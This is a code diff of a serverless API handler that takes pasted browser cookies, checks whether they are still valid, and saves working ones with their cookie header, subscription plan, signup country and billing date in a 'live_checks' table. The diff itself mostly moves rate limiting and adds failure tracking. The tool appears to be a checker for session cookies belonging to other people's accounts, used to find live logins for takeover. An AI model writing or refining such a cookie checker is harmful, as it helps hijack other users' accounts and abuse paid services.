@@ -16,21 +16,18 @@ const supabase = createClient(
   }
 );
 
-const ip = getClientIp(req);
+function getClientIp(req: VercelRequest) {
+  const xff = req.headers["x-forwarded-for"];
+  if (typeof xff === "string" && xff.length > 0) {
+    return xff.split(",")[0].trim();
+  }
 
-if (await isLockedOut(ip)) {
-  return res.status(429).json({
-    valid: false,
-    error: "Too many failed attempts. Try again later.",
-  });
-}
+  const realIp = req.headers["x-real-ip"];
+  if (typeof realIp === "string" && realIp.length > 0) {
+    return realIp;
+  }
 
-const { success } = await ipRateLimit.limit(ip);
-if (!success) {
-  return res.status(429).json({
-    valid: false,
-    error: "Too many requests. Please slow down.",
-  });
+  return "unknown";
 }
 
 async function savePassedCheckAudits(
@@ -41,14 +38,14 @@ async function savePassedCheckAudits(
   if (!passed.length) return;
 
   const rows = passed.map((item) => ({
-  account_id: item.accountId || crypto.randomUUID(),
-  status: "passed",
-  cookie_header: item.cookieHeader || null,
-  plan: item.plan || null,
-  country: item.countryOfSignup || null,
-  checked_at: new Date().toISOString(),
-  expires_at: item.nextBillingRaw || null
-}));
+    account_id: item.accountId || crypto.randomUUID(),
+    status: "passed",
+    cookie_header: item.cookieHeader || null,
+    plan: item.plan || null,
+    country: item.countryOfSignup || null,
+    checked_at: new Date().toISOString(),
+    expires_at: item.nextBillingRaw || null,
+  }));
 
   const { error } = await supabase.from("live_checks").insert(rows);
 
@@ -91,6 +88,23 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       return res.status(405).json({ success: false, error: "Method not allowed" });
     }
 
+    const ip = getClientIp(req);
+
+    if (await isLockedOut(ip)) {
+      return res.status(429).json({
+        success: false,
+        error: "Too many failed attempts. Try again later.",
+      });
+    }
+
+    const { success } = await ipRateLimit.limit(ip);
+    if (!success) {
+      return res.status(429).json({
+        success: false,
+        error: "Too many requests. Please slow down.",
+      });
+    }
+
     const body = req.body || {};
     console.log("Body keys:", Object.keys(body || {}));
 
@@ -98,6 +112,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.log("Parsed input result keys:", parsedInput ? Object.keys(parsedInput) : null);
 
     if (parsedInput?.error) {
+      await recordFailure(ip);
       return res.status(400).json({ success: false, error: parsedInput.error });
     }
 
@@ -105,6 +120,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.log("Cookie count:", Array.isArray(cookies) ? cookies.length : "not-array");
 
     if (!Array.isArray(cookies) || cookies.length === 0) {
+      await recordFailure(ip);
       return res.status(400).json({
         success: false,
         error: "No cookies were provided. Paste Netscape rows, JSON cookie data, or raw/header cookie strings.",
@@ -125,7 +141,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
           {
             account_id: crypto.randomUUID(),
             status: "passed",
-            plan: null, // keep "plant" only if that's your real column name
+            plan: null,
             country: null,
             checked_at: new Date().toISOString(),
             expires_at: null,
@@ -142,11 +158,9 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     console.log("Stream mode:", shouldStream);
 
     if (shouldStream) {
-      console.log("About to run runStreamedCheck");
       return await runStreamedCheck(req, res, cookies, workerCount, checkOptions);
     }
 
-    console.log("About to run runDirectCheck");
     let result = await runDirectCheck(cookies, workerCount, checkOptions);
 
     const retriableCookies: string[] = [];
@@ -159,8 +173,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     });
 
     if (retriableCookies.length > 0) {
-      console.log("Retrying temporary failures:", retriableCookies.length);
-
       const retryResult = await runDirectCheck(retriableCookies, workerCount, {
         ...checkOptions,
         delayMs: 400,
@@ -188,7 +200,13 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       };
     }
 
-    console.log("runDirectCheck finished");
+    const hasValid = Array.isArray(result?.results) && result.results.some((r: any) => r?.valid);
+
+    if (hasValid) {
+      await clearFailures(ip);
+    } else {
+      await recordFailure(ip);
+    }
 
     await savePassedCheckAudits(
       result.results || [],
